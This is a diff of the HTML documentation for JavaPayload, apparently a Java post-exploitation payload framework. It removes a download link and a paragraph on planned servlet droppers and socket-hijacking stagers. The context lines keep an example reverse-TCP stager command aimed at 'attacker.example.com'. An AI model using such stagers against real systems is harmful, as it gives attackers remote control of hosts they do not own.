@@ -12,8 +12,6 @@ p {margin-left: 2em; margin-right: 2em;}
 
 <p><i>&copy; 2010, 2011 Michael 'mihi' Schierl, <tt>&lt;schierlm at users dot sourceforge dot net&gt;</tt></i></p>
 
-<p><a href="JavaPayload-0.2.zip">Download JavaPayload-0.2.zip</a> (both source and compiled classes, 197 KB)</p>
-
 <h2>Introduction</h2>
 
 <p>There are very good frameworks available (like Metasploit) to exploit vulnerabilities in native applications.
@@ -86,7 +84,6 @@ streaming emulation, you can use one host/port only for one simultaneous payload
 multiple times (even multi-threaded). This will work with ReverseTCP and ReverseSSL stagers, you will have to give the full
 command line for this to the stager. Example: <tt>MultiListen ReverseTCP attacker.example.com -- SystemInfo</tt>.
 </p>
-
 
 <p>It is also possible to "convert" any supported stager to a spawning stager. Often Java is embedded
 into other systems (like web browsers), and when the user stops using your web site, your payload will be
@@ -233,13 +230,6 @@ in all conditons, especially since the stage uses static class loading, and the 
 run into a situation where the stage class' Class object is inaccessible to one of the command classes (as it is loaded by a child classloader), which
 has to be solved by dynamically falling back to reflection. I already have an almost working prototype, but it will still need a bit of more testing before
 I can release it.</p>
-
-<p>In addition, I am working on WAR support (drop a servlet and run a stager), including tunnelling connections over HTTP(S), or alternatively
-using a findsock stager that picks the correct socket from private instance variables and hijacks it from the servlet container to create a
-bi-directional channel. The tunnelling stager (working similarily to the <tt>httptunnel</tt> program) is a bit tricky to make really rock-stable,
-because of different timeout settings in different servlet containers. But as the findsock stager will inherently be unstable (depending on the
-fact that the socket object can be found, and that the socket is not read while we use it), the tunnel stager really has to be rock solid in my
-opinion. <tt>:-)</tt></p>
 
 <p>Note that all will be implemented in pure Java with no line of native code!</p>
 
